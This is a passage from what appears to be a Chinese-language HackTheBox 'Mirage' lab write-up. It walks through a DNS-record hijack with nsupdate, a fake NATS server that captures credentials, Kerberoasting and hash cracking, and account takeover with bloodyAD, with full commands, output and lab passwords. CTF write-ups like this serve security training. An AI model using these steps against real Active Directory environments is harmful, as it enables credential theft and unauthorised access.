{\"server_id\":\"NBFHGFVN5SFGGOMK77DO2ZMPJKCOCALBS4HP4ZXDJFQLOFSY77YOVZKY\",\"server_name\":\"NBFHGFVN5SFGGOMK77DO2ZMPJKCOCALBS4HP4ZXDJFQLOFSY77YOVZKY\",\"version\":\"2.11.3\",\"proto\":1,\"git_commit\":\"a82cfda\",\"go\":\"go1.24.2\",\"host\":\"0.0.0.0\",\"port\":4222,\"headers\":true,\"auth_required\":true,\"max_payload\":1048576,\"jetstream\":true,\"client_id\":595,\"client_ip\":\"\u0026#x3C;Your-IP\u003e\",\"xkey\":\"XB2NV6U7Z427TDUHH5JKDGOJXJRXP5LO674AGWTYTYQNQKVZCLYD6AHX\"}\\r\\n'\u003c/span\u003e)\n    \n    data = c.recv(1024)\n    \u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e\"[+] 接收到的数据是:\"\u003c/span\u003e,data)\n    c.close()\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e这里开始攻击\u003c/p\u003e\n\u003cp\u003e首先使用 \u003ccode\u003ensupdate\u003c/code\u003e 来更新目标服务器的记录\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Mirage nsupdate \n\u003e server 10.10.11.78\n\u003e update add nats-svc.mirage.htb 3600 IN A \u0026#x3C;Your-IP\u003e\n\u003e send\n\n➜  Mirage python fake_server.py\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason8%20-%20Mirage/image2.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e这样就接收到了对方传过来的的凭据：\u003ccode\u003eDev_Account_A\u003c/code\u003e:\u003ccode\u003ehx5h7F5554fP@1337!\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e只能说大佬们的思路真的强\u003c/p\u003e\n\u003ch2\u003eNats Server 交互\u003c/h2\u003e\n\u003cp\u003e拿到凭据我们就可以开始和目标服务器开始交互了\u003c/p\u003e\n\u003cp\u003e交互工具：\u003ca href=\"https://github.com/nats-io/natscli?tab=readme-ov-file#installation\"\u003ehttps://github.com/nats-io/natscli?tab=readme-ov-file#installation\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e和目标服务器进行交互\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Mirage nats context add mirage --server nats://nats-svc.mirage.htb --user \u003cspan class=\"hljs-string\"\u003e'Dev_Account_A'\u003c/span\u003e --password \u003cspan class=\"hljs-string\"\u003e'hx5h7F5554fP@1337!'\u003c/span\u003e --\u003cspan class=\"hljs-keyword\"\u003eselect\u003c/span\u003e\nNATS Configuration Context \u003cspan class=\"hljs-string\"\u003e\"mirage\"\u003c/span\u003e\n\n  Server URLs: nats://nats-svc.mirage.htb\n     Username: Dev_Account_A\n     Password: ******************\n         Path: /root/.config/nats/context/mirage.json\n   Connection: OK\n\n➜  Mirage nats stream \u003cspan class=\"hljs-built_in\"\u003els\u003c/span\u003e\n╭─────────────────────────────────────────────────────────────────────────────────╮\n│                                        Streams                                  │\n├───────────┬─────────────┬─────────────────────┬──────────┬───────┬──────────────┤\n│ Name      │ Description │ Created             │ Messages │ Size  │ Last Message │\n├───────────┼─────────────┼─────────────────────┼──────────┼───────┼──────────────┤\n│ auth_logs │             │ 2025-05-05 15:18:19 │ 5        │ 570 B │ 76d14h52m20s │\n╰───────────┴─────────────┴─────────────────────┴──────────┴───────┴──────────────╯\n\n➜  Mirage nats consumer add auth_logs temp_reader --pull --inactive-threshold 1m\n\n[mirage] ? Start policy (all, new, last, subject, 1h, msg sequence) all\n[mirage] ? Acknowledgment policy explicit\n[mirage] ? Replay policy instant\n[mirage] ? Filter Stream by subjects (blank \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e all) \n[mirage] ? Maximum Allowed Deliveries -1\n[mirage] ? Maximum Acknowledgments Pending 0\n[mirage] ? Deliver headers only without bodies No\n[mirage] ? Add a Retry Backoff Policy No\nInformation \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e Consumer auth_logs \u003e temp_reader created 2025-07-21 06:16:40\n\nConfiguration:\n\n                    Name: temp_reader\n               Pull Mode: \u003cspan class=\"hljs-literal\"\u003etrue\u003c/span\u003e\n          Deliver Policy: All\n              Ack Policy: Explicit\n                Ack Wait: 30.00s\n           Replay Policy: Instant\n         Max Ack Pending: 1,000\n       Max Waiting Pulls: 512\n      Inactive Threshold: 1m0s\n\nState:\n\n            Host Version: 2.11.3\n      Required API Level: 0 hosted at level 1\n  Last Delivered Message: Consumer sequence: 0 Stream sequence: 0\n    Acknowledgment Floor: Consumer sequence: 0 Stream sequence: 0\n        Outstanding Acks: 0 out of maximum 1,000\n    Redelivered Messages: 0\n    Unprocessed Messages: 5\n           Waiting Pulls: 0 of maximum 512\n           \n➜  Mirage nats consumer next auth_logs temp_reader --all\n[23:40:36] subj: logs.auth / tries: 1 / cons \u003cspan class=\"hljs-built_in\"\u003eseq\u003c/span\u003e: 4 / str \u003cspan class=\"hljs-built_in\"\u003eseq\u003c/span\u003e: 4 / pending: 1\n\n{\u003cspan class=\"hljs-string\"\u003e\"user\"\u003c/span\u003e:\u003cspan class=\"hljs-string\"\u003e\"david.jjackson\"\u003c/span\u003e,\u003cspan class=\"hljs-string\"\u003e\"password\"\u003c/span\u003e:\u003cspan class=\"hljs-string\"\u003e\"pN8kQmn6b86!1234@\"\u003c/span\u003e,\u003cspan class=\"hljs-string\"\u003e\"ip\"\u003c/span\u003e:\u003cspan class=\"hljs-string\"\u003e\"10.10.10.20\"\u003c/span\u003e}\n\nAcknowledged message\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e得到一个用户凭据\u003ccode\u003edavid.jjackson\u003c/code\u003e:\u003ccode\u003eN8kQmn6b86!1234@\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e测试凭据，记得要使用 \u003ccode\u003eKerberos\u003c/code\u003e 协议\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Mirage nxc smb dc01.mirage.htb -u david.jjackson -p \u003cspan class=\"hljs-string\"\u003e'pN8kQmn6b86!1234@'\u003c/span\u003e -k                             \nSMB         dc01.mirage.htb 445    dc01             [*]  x64 (name:dc01) (domain:mirage.htb) (signing:True) (SMBv1:False) (NTLM:False)\nSMB         dc01.mirage.htb 445    dc01             [+] mirage.htb\\david.jjackson:pN8kQmn6b86!1234@ \n\n➜  Mirage nxc ldap 10.10.11.78 -u david.jjackson -p \u003cspan class=\"hljs-string\"\u003e'pN8kQmn6b86!1234@'\u003c/span\u003e -k                             \nLDAP        10.10.11.78     389    DC01             [*] None (name:DC01) (domain:mirage.htb) \nLDAP        10.10.11.78     389    DC01             [+] mirage.htb\\david.jjackson:pN8kQmn6b86!1234@  \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e再生成\u003ccode\u003ekrb5.conf\u003c/code\u003e 文件\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Mirage nxc smb dc01.mirage.htb -u david.jjackson -p \u003cspan class=\"hljs-string\"\u003e'pN8kQmn6b86!1234@'\u003c/span\u003e -k --generate-krb5-file /etc/krb5.conf\nSMB         dc01.mirage.htb 445    dc01             [*]  x64 (name:dc01) (domain:mirage.htb) (signing:True) (SMBv1:False) (NTLM:False)\nSMB         dc01.mirage.htb 445    dc01             [+] mirage.htb\\david.jjackson:pN8kQmn6b86!1234@ \n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Mirage \u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e /etc/krb5.conf\n\n[libdefaults]\n    dns_lookup_kdc = \u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e\n    dns_lookup_realm = \u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e\n    default_realm = MIRAGE.HTB\n\n[realms]\n    MIRAGE.HTB = {\n        kdc = dc01.mirage.htb\n        admin_server = dc01.mirage.htb\n        default_domain = mirage.htb\n    }\n\n[domain_realm]\n    .mirage.htb = MIRAGE.HTB\n    mirage.htb = MIRAGE.HTB\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003e域分析\u003c/h2\u003e\n\u003cp\u003e收集信息\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Mirage bloodhound-python -d \u003cspan class=\"hljs-string\"\u003e'mirage.htb'\u003c/span\u003e -ns 10.10.11.78 --zip -c All -dc \u003cspan class=\"hljs-string\"\u003e'dc01.mirage.htb'\u003c/span\u003e -u \u003cspan class=\"hljs-string\"\u003e'david.jjackson'\u003c/span\u003e -p \u003cspan class=\"hljs-string\"\u003e'pN8kQmn6b86!1234@'\u003c/span\u003e -k\nINFO: BloodHound.py \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e BloodHound LEGACY (BloodHound 4.2 and 4.3)\nINFO: Found AD domain: mirage.htb\nINFO: Getting TGT \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e user\nINFO: Connecting to LDAP server: dc01.mirage.htb\nINFO: Found 1 domains\nINFO: Found 1 domains \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e the forest\nINFO: Found 1 computers\nINFO: Connecting to LDAP server: dc01.mirage.htb\nINFO: Found 12 \u003cspan class=\"hljs-built_in\"\u003eusers\u003c/span\u003e\nINFO: Found 57 \u003cspan class=\"hljs-built_in\"\u003egroups\u003c/span\u003e\nINFO: Found 2 gpos\nINFO: Found 21 ous\nINFO: Found 19 containers\nINFO: Found 0 trusts\nINFO: Starting computer enumeration with 10 workers\nINFO: Querying computer: dc01.mirage.htb\nINFO: Done \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e 00M 14S\nINFO: Compressing output into 20250721063431_bloodhound.zip\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e用户组信息\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason8%20-%20Mirage/image3.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e其中 \u003ccode\u003eNATHAN.AADAM\u003c/code\u003e 用户属于远程管理组，暂时是目标用户\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason8%20-%20Mirage/image4.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003ch2\u003e横线移动\u003c/h2\u003e\n\u003ch3\u003eTo NATHAN.AADAM\u003c/h3\u003e\n\u003cp\u003e尝试寻找未开启预认证的用户，无果\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Mirage GetNPUsers.py -dc-ip 10.10.11.78 mirage.htb/ -usersfile \u003cspan class=\"hljs-built_in\"\u003eusers\u003c/span\u003e -k\n  import pkg_resources\nImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies \n\n/root/.local/bin/GetNPUsers.py:165: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e removal \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e a future version. Use timezone-aware objects to represent datetimes \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e UTC: datetime.datetime.now(datetime.UTC).\n  now = datetime.datetime.utcnow() + datetime.timedelta(days=1)\n[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)\n[-] User NATHAN.AADAM doesn\u003cspan class=\"hljs-string\"\u003e't have UF_DONT_REQUIRE_PREAUTH set\n[-] User MARK.BBOND doesn'\u003c/span\u003et have UF_DONT_REQUIRE_PREAUTH \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003e\n[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)\n[-] User DEV_ACCOUNT_A doesn\u003cspan class=\"hljs-string\"\u003e't have UF_DONT_REQUIRE_PREAUTH set\n[-] User DEV_ACCOUNT_B doesn'\u003c/span\u003et have UF_DONT_REQUIRE_PREAUTH \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e扒拉 \u003ccode\u003eSMB\u003c/code\u003e 的文件，无果\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Mirage nxc smb dc01.mirage.htb -u david.jjackson -p \u003cspan class=\"hljs-string\"\u003e'pN8kQmn6b86!1234@'\u003c/span\u003e -k -M spider_plus -o DOWNLOAD_FLAG=True\nSMB         dc01.mirage.htb 445    dc01             [*]  x64 (name:dc01) (domain:mirage.htb) (signing:True) (SMBv1:False) (NTLM:False)\nSMB         dc01.mirage.htb 445    dc01             [+] mirage.htb\\david.jjackson:pN8kQmn6b86!1234@ \nSPIDER_PLUS dc01.mirage.htb 445    dc01             [*] Started module spidering_plus with the following options:\nSPIDER_PLUS dc01.mirage.htb 445    dc01             [*]  DOWNLOAD_FLAG: True\nSPIDER_PLUS dc01.mirage.htb 445    dc01             [*]     STATS_FLAG: True\nSPIDER_PLUS dc01.mirage.htb 445    dc01             [*] EXCLUDE_FILTER: [\u003cspan class=\"hljs-string\"\u003e'print$'\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e'ipc$'\u003c/span\u003e]\nSPIDER_PLUS dc01.mirage.htb 445    dc01             [*]   EXCLUDE_EXTS: [\u003cspan class=\"hljs-string\"\u003e'ico'\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e'lnk'\u003c/span\u003e]\nSPIDER_PLUS dc01.mirage.htb 445    dc01             [*]  MAX_FILE_SIZE: 50 KB\nSPIDER_PLUS dc01.mirage.htb 445    dc01             [*]  OUTPUT_FOLDER: /root/.nxc/modules/nxc_spider_plus\nSMB         dc01.mirage.htb 445    dc01             [*] Enumerated shares\nSMB         dc01.mirage.htb 445    dc01             Share           Permissions     Remark\nSMB         dc01.mirage.htb 445    dc01             -----           -----------     ------\nSMB         dc01.mirage.htb 445    dc01             ADMIN$                          Remote Admin\nSMB         dc01.mirage.htb 445    dc01             C$                              Default share\nSMB         dc01.mirage.htb 445    dc01             IPC$            READ            Remote IPC\nSMB         dc01.mirage.htb 445    dc01             NETLOGON        READ            Logon server share \nSMB         dc01.mirage.htb 445    dc01             SYSVOL          READ            Logon server share\nSPIDER_PLUS dc01.mirage.htb 445    dc01             [+] Saved share-file metadata to \u003cspan class=\"hljs-string\"\u003e\"/root/.nxc/modules/nxc_spider_plus/dc01.mirage.htb.json\"\u003c/span\u003e.\nSPIDER_PLUS dc01.mirage.htb 445    dc01             [*] SMB Shares:           5 (ADMIN$, C$, IPC$, NETLOGON, SYSVOL)\nSPIDER_PLUS dc01.mirage.htb 445    dc01             [*] SMB Readable Shares:  3 (IPC$, NETLOGON, SYSVOL)\nSPIDER_PLUS dc01.mirage.htb 445    dc01             [*] SMB Filtered Shares:  1\nSPIDER_PLUS dc01.mirage.htb 445    dc01             [*] Total folders found:  25\nSPIDER_PLUS dc01.mirage.htb 445    dc01             [*] Total files found:    6\nSPIDER_PLUS dc01.mirage.htb 445    dc01             [*] File size average:    1.43 KB\nSPIDER_PLUS dc01.mirage.htb 445    dc01             [*] File size min:        23 B\nSPIDER_PLUS dc01.mirage.htb 445    dc01             [*] File size max:        4.25 KB\nSPIDER_PLUS dc01.mirage.htb 445    dc01             [*] File unique exts:     4 (pol, inf, csv, ini)\nSPIDER_PLUS dc01.mirage.htb 445    dc01             [*] Downloads successful: 6\nSPIDER_PLUS dc01.mirage.htb 445    dc01             [+] All files processed successfully.\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e尝试执行 \u003ccode\u003eKerberoasting\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e成功将\u003ccode\u003enathan.aadam\u003c/code\u003e 的 \u003ccode\u003eTGS\u003c/code\u003e 票据导出来\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Mirage GetUserSPNs.py mirage.htb/\u003cspan class=\"hljs-string\"\u003e'david.jjackson'\u003c/span\u003e:\u003cspan class=\"hljs-string\"\u003e'pN8kQmn6b86!1234@'\u003c/span\u003e -dc-host DC01.mirage.htb -k -debug -outputfile SPNHASH\n  import pkg_resources\nImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies \n\n[+] Impacket Library Installation Path: /root/.local/share/pipx/venvs/impacket/lib/python3.13/site-packages/impacket\n[+] Connecting to DC01.mirage.htb, port 389, SSL False\n[+] Using Kerberos Cache: david.jjackson.ccache\n[+] SPN LDAP/DC01.MIRAGE.HTB@MIRAGE.HTB not found \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e cache\n[+] AnySPN is True, looking \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e another suitable SPN\n[+] Returning cached credential \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e KRBTGT/MIRAGE.HTB@MIRAGE.HTB\n[+] Using TGT from cache\n[+] Trying to connect to KDC at MIRAGE.HTB:88\n[+] Total of records returned 4\nServicePrincipalName      Name          MemberOf                                                             PasswordLastSet             LastLogon                   Delegation \n------------------------  ------------  -------------------------------------------------------------------  --------------------------  --------------------------  ----------\nHTTP/exchange.mirage.htb  nathan.aadam  CN=Exchange_Admins,OU=Groups,OU=Admins,OU=IT_Staff,DC=mirage,DC=htb  2025-06-24 05:18:18.584667  2025-07-21 18:31:07.044066             \n\n[+] Using Kerberos Cache: david.jjackson.ccache\n[+] Returning cached credential \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e KRBTGT/MIRAGE.HTB@MIRAGE.HTB\n[+] Using TGT from cache\n[+] Username retrieved from CCache: david.jjackson\n[+] Trying to connect to KDC at MIRAGE.HTB:88\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e爆破票据得到密码：\u003ccode\u003e3edc#EDC3\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Mirage hashcat -m 13100 SPNHASH /usr/share/wordlists/rockyou.txt \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason8%20-%20Mirage/image5.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e远程登录上去，拿到立足点\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Mirage getTGT.py mirage.htb/\u003cspan class=\"hljs-string\"\u003e'NATHAN.AADAM'\u003c/span\u003e:\u003cspan class=\"hljs-string\"\u003e'3edc#EDC3'\u003c/span\u003e -dc-ip 10.10.11.78\n\n➜  Mirage \u003cspan class=\"hljs-built_in\"\u003eexport\u003c/span\u003e KRB5CCNAME=NATHAN.AADAM.ccache \n\n➜  Mirage evil-winrm -i dc01.mirage.htb -r MIRAGE.HTB -u NATHAN.AADAM -p \u003cspan class=\"hljs-string\"\u003e'3edc#EDC3'\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason8%20-%20Mirage/image6.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e*Evil-WinRM* PS C:\\Users\\nathan.aadam\\Desktop\u003e \u003cspan class=\"hljs-built_in\"\u003etype\u003c/span\u003e user.txt\nb34xxxxxxxxxxxxxxxxxxxxxxxx\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch3\u003eTo \u003cstrong\u003eMARK.BBOND\u003c/strong\u003e\u003c/h3\u003e\n\u003cp\u003e又看了一下 \u003ccode\u003eBloodHound\u003c/code\u003e，发现 \u003ccode\u003eMARK.BBOND\u003c/code\u003e 可以修改 ****\u003ccode\u003eJAVIER.MMARSHALL\u003c/code\u003e 的密码\u003c/p\u003e\n\u003cp\u003e所以暂时为下一个目标用户\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason8%20-%20Mirage/image7.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e使用 \u003ccode\u003eWinpeas\u003c/code\u003e 来收集信息\u003c/p\u003e\n\u003cp\u003e发现 \u003ccode\u003emark.bbond\u003c/code\u003e 用户在\u003ccode\u003eAutoLogon\u003c/code\u003e中有自动登录的明文凭据\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason8%20-%20Mirage/image8.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e测试凭据\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Mirage getTGT.py mirage.htb/\u003cspan class=\"hljs-string\"\u003e'mark.bbond'\u003c/span\u003e:\u003cspan class=\"hljs-string\"\u003e'1day@atime'\u003c/span\u003e -dc-ip 10.10.11.78\n  import pkg_resources\nImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies \n\n[*] Saving ticket \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e mark.bbond.ccache\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Mirage nxc smb dc01.mirage.htb --use-kcache -k     \nSMB         dc01.mirage.htb 445    dc01             [*]  x64 (name:dc01) (domain:mirage.htb) (signing:True) (SMBv1:False) (NTLM:False)\nSMB         dc01.mirage.htb 445    dc01             [+] MIRAGE.HTB\\mark.bbond from ccache\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch3\u003eTo JAVIER.MMARSHALL\u003c/h3\u003e\n\u003cp\u003e从上面可以知道用户\u003ccode\u003emark.bbond\u003c/code\u003e 可以强制修改 \u003ccode\u003eJAVIER.MMARSHALL\u003c/code\u003e 用户的密码\u003c/p\u003e\n\u003cp\u003e通过 \u003ccode\u003ebloodyAD\u003c/code\u003e 来实现\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Mirage bloodyAD -d \u003cspan class=\"hljs-string\"\u003e'mirage.htb'\u003c/span\u003e -k --host dc01.mirage.htb \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003e password \u003cspan class=\"hljs-string\"\u003e'JAVIER.MMARSHALL'\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'Password@123'\u003c/span\u003e\n[+] Password changed successfully!\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e请求 \u003ccode\u003eTGT\u003c/code\u003e 时会提示，用户被禁用了\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Mirage getTGT.py mirage.htb/\u003cspan class=\"hljs-string\"\u003e'JAVIER.MMARSHALL'\u003c/span\u003e:\u003cspan class=\"hljs-string\"\u003e'Password@123'\u003c/span\u003e -dc-ip 10.10.11.78\n  import pkg_resources\nImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies \n\nKerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e我们通过 \u003ccode\u003eBloodyAD\u003c/code\u003e查一下是否被禁用了\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Mirage bloodyAD --kerberos -u \u003cspan class=\"hljs-string\"\u003e\"mark.bbond\"\u003c/span\u003e -p \u003cspan class=\"hljs-string\"\u003e'1day@atime'\u003c/span\u003e -d \u003cspan class=\"hljs-string\"\u003e\"mirage.htb\"\u003c/span\u003e --host \u003cspan class=\"hljs-string\"\u003e\"dc01.mirage.htb\"\u003c/span\u003e get object \u003cspan class=\"hljs-string\"\u003e\"mark.bbond\"\u003c/span\u003e --attr userAccountControl\n\ndistinguishedName: CN=mark.bbond,OU=Users,OU=Support,OU=IT_Staff,DC=mirage,DC=htb\nuserAccountControl: NORMAL_ACCOUNT; DONT_EXPIRE_PASSWORD\n\n➜  Mirage bloodyAD --kerberos -u \u003cspan class=\"hljs-string\"\u003e\"mark.bbond\"\u003c/span\u003e -p \u003cspan class=\"hljs-string\"\u003e'1day@atime'\u003c/span\u003e -d \u003cspan class=\"hljs-string\"\u003e\"mirage.htb\"\u003c/span\u003e --host \u003cspan class=\"hljs-string\"\u003e\"dc01.mirage.htb\"\u003c/span\u003e get object \u003cspan class=\"hljs-string\"\u003e\"javier.mmarshall\"\u003c/span\u003e --attr userAccountControl\n\ndistinguishedName: CN=javier.mmarshall,OU=Users,OU=Disabled,DC=mirage,DC=htb\nuserAccountControl: ACCOUNTDISABLE; NORMAL_ACCOUNT\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003ccode\u003eACCOUNTDISABLE\u003c/code\u003e 用户被禁用了，我们将其\u003ccode\u003eACCOUNTDISABLE\u003c/code\u003e 属性删掉\u003c/p\u003e\n\u003cp\u003e我们有强制修改其密码的权限，那么应该可以修改账户属性\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Mirage bloodyAD --kerberos -u \u003cspan class=\"hljs-string\"\u003e\"mark.bbond\"\u003c/span\u003e -p \u003cspan class=\"hljs-string\"\u003e'1day@atime'\u003c/span\u003e -d \u003cspan class=\"hljs-string\"\u003e\"mirage.htb\"\u003c/span\u003e --host \u003cspan class=\"hljs-string\"\u003e\"dc01.mirage.htb\"\u003c/span\u003e remove uac \u003cspan class=\"hljs-string\"\u003e'javier.mmarshall'\u003c/span\u003e -f ACCOUNTDISABLE\n[-] [\u003cspan class=\"hljs-string\"\u003e'ACCOUNTDISABLE'\u003c/span\u003e] property flags removed from javier.mmarshall\u003cspan class=\"hljs-string\"\u003e's userAccountControl\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e设置完后我们再查看一次\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Mirage bloodyAD --kerberos -u \u003cspan class=\"hljs-string\"\u003e\"mark.bbond\"\u003c/span\u003e -p \u003cspan class=\"hljs-string\"\u003e'1day@atime'\u003c/span\u003e -d \u003cspan class=\"hljs-string\"\u003e\"mirage.htb\"\u003c/span\u003e --host \u003cspan class=\"hljs-string\"\u003e\"dc01.mirage.htb\"\u003c/span\u003e get object \u003cspan class=\"hljs-string\"\u003e\"javier.mmarshall\"\u003c/span\u003e --attr userAccountControl\n\ndistinguishedName: CN=javier.mmarshall,OU=Users,OU=Disabled,DC=mirage,DC=htb\nuserAccountControl: NORMAL_ACCOUNT\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e对比正常的用户还少一个密码永不过期，我们也给他添加上去\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Mirage bloodyAD --kerberos -u \u003cspan class=\"hljs-string\"\u003e\"mark.bbond\"\u003c/span\u003e -p \u003cspan class=\"hljs-string\"\u003e'1day@atime'\u003c/span\u003e -d \u003cspan class=\"hljs-string\"\u003e\"mirage.htb\"\u003c/span\u003e --host \u003cspan class=\"hljs-string\"\u003e\"dc01.mirage.htb\"\u003c/span\u003e add uac \u003cspan class=\"hljs-string\"\u003e'javier.mmarshall'\u003c/span\u003e -f DONT_EXPIRE_PASSWORD\n[-] [\u003cspan class=\"hljs-string\"\u003e'DONT_EXPIRE_PASSWORD'\u003c/span\u003e] property flags added to javier.mmarshall\u003cspan class=\"hljs-string\"\u003e's userAccountControl\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e但还是失败了\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Mirage getTGT.py mirage.htb/\u003cspan class=\"hljs-string\"\u003e'JAVIER.MMARSHALL'\u003c/span\u003e:\u003cspan class=\"hljs-string\"\u003e'Password@123'\u003c/span\u003e -dc-ip 10.10.11.78                                                                     \n  import pkg_resources\nImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies \n\nKerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e最后发现还需要修改\u003ccode\u003eLogon Hours\u003c/code\u003e ，因为\u003ccode\u003ejavier.mmarshall\u003c/code\u003e 的 \u003ccode\u003eLogonHours\u003c/code\u003e 是空的\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Mirage bloodyAD --kerberos -u \u003cspan class=\"hljs-string\"\u003e\"mark.bbond\"\u003c/span\u003e -p \u003cspan class=\"hljs-string\"\u003e'1day@atime'\u003c/span\u003e -d \u003cspan class=\"hljs-string\"\u003e\"mirage.htb\"\u003c/span\u003e --host \u003cspan class=\"hljs-string\"\u003e\"dc01.mirage.htb\"\u003c/span\u003e get object \u003cspan class=\"hljs-string\"\u003e\"javier.mmarshall\"\u003c/span\u003e --attr LogonHours \n\ndistinguishedName: CN=javier.mmarshall,OU=Users,OU=Disabled,DC=mirage,DC=htb\nlogonHours: \n\n➜  Mirage bloodyAD --kerberos -u \u003cspan class=\"hljs-string\"\u003e\"mark.bbond\"\u003c/span\u003e -p \u003cspan class=\"hljs-string\"\u003e'1day@atime'\u003c/span\u003e -d \u003cspan class=\"hljs-string\"\u003e\"mirage.htb\"\u003c/span\u003e --host \u003cspan class=\"hljs-string\"\u003e\"dc01.mirage.htb\"\u003c/span\u003e get object \u003cspan class=\"hljs-string\"\u003e\"mark.bbond\"\u003c/span\u003e --attr LogonHours\n\ndistinguishedName: 